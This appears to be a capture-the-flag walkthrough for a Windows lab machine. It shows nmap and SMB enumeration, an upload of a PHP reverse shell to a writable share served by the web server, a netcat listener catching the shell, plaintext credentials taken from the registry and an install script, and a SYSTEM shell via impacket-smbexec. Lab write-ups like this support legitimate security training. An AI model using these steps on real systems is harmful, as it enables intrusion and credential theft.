## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.52.109
# HOSTNAME //Found Post Initial Enumeration
DESKTOP-997GG7D
# OPERATING SYSTEM //Found Post Initial Enumeration
Microsoft Windows [Version 10.0.18362.1256]
# CREDENTIALS  //Found Post Initial Enumeration
sign:gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi
```
## OPEN PORTS DETAILS
```bash
21/tcp    open  ftp            syn-ack ttl 125 Microsoft ftpd

80/tcp    open  http           syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
443/tcp   open  ssl/http       syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)

135/tcp   open  msrpc          syn-ack ttl 125 Microsoft Windows RPC

139/tcp   open  netbios-ssn    syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?  syn-ack ttl 125

3389/tcp  open  ms-wbt-server? syn-ack ttl 125

5040/tcp  open  unknown        syn-ack ttl 125
5900/tcp  open  vnc            syn-ack ttl 125 VNC (protocol 3.8)

49664/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49676/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49677/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
```
# ENUMERATION
## PORT 139 445
```bash
# Enumerating Shares
sudo crackmapexec smb $ip --shares -u 'anonymous' -p ''
SMB         10.10.52.109    445    DESKTOP-997GG7D  [*] Windows 10 / Server 2019 Build 18362 x64 (name:DESKTOP-997GG7D) (domain:DESKTOP-997GG7D) (signing:False) (SMBv1:False)
SMB         10.10.52.109    445    DESKTOP-997GG7D  [+] DESKTOP-997GG7D\anonymous: 
SMB         10.10.52.109    445    DESKTOP-997GG7D  [+] Enumerated shares
SMB         10.10.52.109    445    DESKTOP-997GG7D  Share           Permissions     Remark
SMB         10.10.52.109    445    DESKTOP-997GG7D  -----           -----------     ------
SMB         10.10.52.109    445    DESKTOP-997GG7D  ADMIN$                          Remote Admin
SMB         10.10.52.109    445    DESKTOP-997GG7D  C$                              Default share
SMB         10.10.52.109    445    DESKTOP-997GG7D  images$         READ,WRITE      
SMB         10.10.52.109    445    DESKTOP-997GG7D  Installs$                       
SMB         10.10.52.109    445    DESKTOP-997GG7D  IPC$            READ            Remote IPC
SMB         10.10.52.109    445    DESKTOP-997GG7D  Users           READ            

# Found shares
- images$ with permissions READ,WRITE
- Users with permissions READ

# Access the Share
sudo smbclient //$ip/images$                           
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Mar  5 13:15:27 2025
  ..                                  D        0  Wed Mar  5 13:15:27 2025
  internet-1028794_1920.jpg           A   134193  Mon Jan 11 03:22:24 2021
  man-1459246_1280.png                A   363259  Mon Jan 11 03:20:49 2021
  monitor-1307227_1920.jpg            A   691570  Mon Jan 11 03:20:29 2021
  neon-sign-4716257_1920.png          A  1461192  Mon Jan 11 03:23:59 2021

sudo smbclient //$ip/Users  
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Nov 14 21:05:50 2020
  ..                                 DR        0  Sat Nov 14 21:05:50 2020
  Default                           DHR        0  Sat Nov 14 18:35:37 2020
  desktop.ini                       AHS      174  Tue Mar 19 10:19:34 2019
```
## PORT 80 443
```bash
# Recon
sudo whatweb -v $url
Summary   : Apache[2.4.46], HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11], JQuery[3.5.1], OpenSSL[1.1.1g], PHP[7.4.11], Script

- Accessing url http://10.10.52.109
- Images Url http://10.10.52.109/images/internet-1028794_1920.jpg

- Seems like the images folder is listed as share with READ,WRITE permission as internet-1028794_1920.jpg is also found on the share images$
```
## INITIAL FOOTHOLD
```bash
- Since the Site uses php as web technology try upload php reverse shell and execute via web to gain a recerse shell

# Reverse Shell Source
https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php

- Change lhost and lport and Upload the shell.php file to images$ share
sudo curl http://10.10.52.109/images/shell.php

sudo rlwrap nc -nvlp 9000     
[sudo] password for kali: 
listening on [any] 9000 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.52.109] 49942
SOCKET: Shell has connected! PID: 4640
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\images>whoami
desktop-997gg7d\sign
```
## PRIVILEGE ESCALATION
```bash
# Searching for logon passwords
C:\xampp\htdocs\images>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

DefaultUsername    REG_SZ    .\sign
DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH

# Credentials
sign:gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH

- Found Directory Installs on C:\
C:\Installs>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Installs

14/11/2020  15:37    <DIR>          .
14/11/2020  15:37    <DIR>          ..
14/11/2020  15:40               548 Install Guide.txt
14/11/2020  15:19               800 Install_www_and_deploy.bat
14/11/2020  13:59           339,096 PsExec.exe
14/11/2020  14:28    <DIR>          simepleslide
14/11/2020  14:01               182 simepleslide.zip
14/11/2020  15:14               147 startup.bat
14/11/2020  14:43             1,292 ultravnc.ini
14/11/2020  14:00         3,129,968 UltraVNC_1_2_40_X64_Setup.exe
14/11/2020  13:59       162,450,672 xampp-windows-x64-7.4.11-0-VC15-installer.exe
               8 File(s)    165,922,705 bytes
               3 Dir(s)  16,898,224,128 bytes free

# Found Administrator Credentials
C:\Installs>type Install_www_and_deploy.bat
@echo off
REM Shop Sign Install Script 
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause

# Administration Credentials
administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi

# Administrator Shell
sudo impacket-smbexec administrator@$ip
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users\Administrator\Desktop

11/14/2020  02:32 PM    <DIR>          .
11/14/2020  02:32 PM    <DIR>          ..
11/14/2020  02:31 PM                54 admin_flag.txt
               1 File(s)             54 bytes
               2 Dir(s)  16,908,697,600 bytes free

C:\Windows\system32>whoami
nt authority\system

```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Wed Mar  5 12:56:23 2025 as: /usr/lib/nmap/nmap -p 21,139,80,443,135,445,3389,5040,5900,49666,49676,49667,49668,49664,49677,49665 -sC -sV -vv -oN nmap/scan-script-version 10.10.52.109
Nmap scan report for 10.10.52.109
Host is up, received reset ttl 125 (0.38s latency).
Scanned at 2025-03-05 12:56:26 IST for 195s

PORT      STATE SERVICE        REASON          VERSION
21/tcp    open  ftp            syn-ack ttl 125 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_11-14-20  03:26PM                  173 notice.txt
80/tcp    open  http           syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: Simple Slide Show
135/tcp   open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http       syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
|_ssl-date: TLS randomness does not represent time
|_http-title: Simple Slide Show
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
445/tcp   open  microsoft-ds?  syn-ack ttl 125
3389/tcp  open  ms-wbt-server? syn-ack ttl 125
| ssl-cert: Subject: commonName=DESKTOP-997GG7D
| Issuer: commonName=DESKTOP-997GG7D
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-04T07:21:24
| Not valid after:  2025-09-03T07:21:24
| MD5:   235d:3a8c:f3c4:0bac:9648:6813:5d40:07ef
| SHA-1: 99f0:d073:0b43:50a6:d69d:64d0:f3d4:279a:7920:c5ad
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQFeaL/Il3P6JBkOaCvHJaljANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwHhcNMjUwMzA0MDcyMTI0WhcNMjUw
| OTAzMDcyMTI0WjAaMRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQChyFKtL6hNfCsFFnMyN81xs/qe4qYLObVT
| JwGk7t4PtY28l9QWcHFhZPew8WLraYP2hWhGRC8mEPIfRA4zuPrLLd0YOABpUd3p
| t3KsCaL7rpCYtL89BTjiPrBJBSvI148eP95DndbXM84Lap8pkRR/uepAWtaNbIT2
| iUUrxj9dXHXFCcYj7cnSyvt3kLcyBxpzH0HSoZ7wTs7bcK7cTAEuP+MDO6BuNGv4
| 1bSyWpQV00eMqMm5zKtafupS05pawCDIcwGy6NlflUF0WkmKtqgqod1Rsw6qaZ0w
| 6M+9gm3Bz3CkiQrTGho7VjthhB8RFqI2vJfQH55jmfpTPFVdzxj5AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAJyTPYOXRy/qr6paXjB0NdiFG/lZD3AbXl6PJBH0Jb6ZtwNbpNjdFXfC3
| Kmp2MQ4I59YFecII31XEt1vHyWlYykWy5lxsZboEO8L+kF29P7DXlJyrFcsRV07B
| 8hy+LtUvqAKS80u6PUyV/r0oc4lpJBeuTBQI4J6/fGKxegVeSbIH6By7BMFmefkn
| fgUQcI/2wzVIrqc0ewind35tnyZqrPgs5+taQdZPkHEh++2XlJLzda+iAo03Xn61
| 3qFU2faOcQ66jgnQ+q/cLDZMZCcoeRmcCA2VKX4pEzS43YKwFVHi5xj2mymkyRKg
| hQNfTBRSDZpvu9HERcyBwnOYMm31Ug==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: DESKTOP-997GG7D
|   NetBIOS_Domain_Name: DESKTOP-997GG7D
|   NetBIOS_Computer_Name: DESKTOP-997GG7D
|   DNS_Domain_Name: DESKTOP-997GG7D
|   DNS_Computer_Name: DESKTOP-997GG7D
|   Product_Version: 10.0.18362
|_  System_Time: 2025-03-05T07:29:19+00:00
|_ssl-date: 2025-03-05T07:29:34+00:00; 0s from scanner time.
5040/tcp  open  unknown        syn-ack ttl 125
5900/tcp  open  vnc            syn-ack ttl 125 VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     Ultra (17)
|_    VNC Authentication (2)
49664/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49676/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49677/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21593/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27571/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 14750/udp): CLEAN (Failed to receive data)
|   Check 4 (port 10890/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-05T07:29:16
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  5 12:59:41 2025 -- 1 IP address (1 host up) scanned in 197.55 seconds

```

